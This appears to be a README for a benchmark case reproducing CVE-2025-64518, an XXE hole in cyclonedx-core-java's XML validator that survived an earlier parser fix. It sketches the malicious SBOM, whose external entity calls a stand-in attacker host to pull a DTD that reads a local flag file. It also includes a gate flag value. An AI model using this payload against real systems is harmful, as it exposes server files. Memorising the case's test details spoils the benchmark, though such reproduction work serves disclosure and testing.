# cyclonedx-cve-2025-64518

org.cyclonedx:cyclonedx-core-java — CVE-2024-38374 -> CVE-2025-64518 (XXE hardened in the XML
BOM parser but not the sibling validator, CWE-611).
**Genuine incomplete fix; gate passed on real Docker over EXTERNAL HTTP.**

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

REAL Java HTTP service (`App.java`, JDK `com.sun.net.httpserver.HttpServer`) exposes
`POST /parse` -> the REAL Maven Central `org.cyclonedx.parsers.XmlParser.parse(byte[])` and
`POST /validate` -> `XmlParser.validate(byte[])` on the attacker-supplied request-body XML
SBOM. 310 real `org/cyclonedx/*.class` are shaded per image; only the pinned cyclonedx-core-java
version (build-arg `CDX_VER`) differs across v0/v1/v2 — the service code is identical. GHSA-6fhj-vr9j-g45r
(CVE-2025-64518) states verbatim: "The fix for GHSA-683x-4444-jxh8 / CVE-2024-38374 has been
incomplete in that it only fixed parsing of XML BOMs, but not validation." Canary = benign
error-based local-file read: the SBOM pulls an attacker-hosted external parameter-entity DTD
(`attacker` compose service, `evil.dtd`) that reads `file:///flag` (per-run `${PCB_FLAG}`,
planted at container start, outside the app) and embeds it as the SYSTEM id of an unresolvable
entity — so the flag surfaces in the REAL library's own `java.io.FileNotFoundException:
/PCBERR/<flag>` exception text, echoed verbatim in the HTTP response. No shell, no network
egress beyond the attacker DTD host.

- **V0 = cyclonedx-core-java 8.0.0** (`:34840`) — `parse()` evaluates an XPath over the SBOM
  with a DEFAULT (insecure) `DocumentBuilder` -> external DTD resolves -> flag in the parse
  exception text. (Its `validate` path is equally open.)
- **V1 = cyclonedx-core-java 9.0.4** (`:34841`, target; CVE-2024-38374 fix, commit `ab0bc9c`) —
  `parse()` now uses `createSecureDocument` (`ACCESS_EXTERNAL_DTD=""` /
  `ACCESS_EXTERNAL_SCHEMA=""`) -> the seed's DTD is refused ("'http' access is not allowed due
  to restriction set by the accessExternalDTD property") -> seed BLOCKED. But the sibling
  VALIDATE path builds its `Validator` from `CycloneDxSchema.getXmlSchema(...)`, whose
  `SchemaFactory` was left unhardened -> the residual still resolves the DTD on V1. Incomplete fix.
- **V2 = cyclonedx-core-java 11.0.1** (`:34842`, CVE-2025-64518 fix) — `getXmlSchema` sets
  `ACCESS_EXTERNAL_DTD`/`ACCESS_EXTERNAL_SCHEMA=""` + `FEATURE_SECURE_PROCESSING=true` on the
  `SchemaFactory`, propagating to the spawned `Validator` -> residual BLOCKED.

Identical malicious SBOM (`DOCTYPE ... <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">` on a
`<bom xmlns="http://cyclonedx.org/schema/bom/1.6"/>` document) for both triggers — only the
ENDPOINT differs, which is the point: the incomplete fix is a sibling code path, not a payload
difference.

- **Original trigger**: the XXE SBOM POSTed to `/parse` (CVE-2024-38374 parser path). Reaches on
  8.0.0, blocked on 9.0.4.
- **Residual trigger**: the SAME XXE SBOM POSTed to `/validate` (CVE-2025-64518 validator path,
  `XmlParser.validate` -> `getXmlSchema(schemaVersion).newValidator().validate(source)`).
  Reaches on 9.0.4 (`java.io.FileNotFoundException: /PCBERR/<flag>` in a returned
  `ParseException`), blocked on 11.0.1.

Run: `python3 oracle.py --gate` (env already up; `--wait` polls v0+v1+v2 readiness first).
See `repro.log` and `case.json` (gate 2026-07-17, flag
`PCBFLAG_50155f6594ffff28dee08eb382f2c499`: parse-XXE reaches@v0 / blocked@v1 /
validate-XXE reaches@v1 / blocked@v2; all four gate booleans verified live on
Docker).
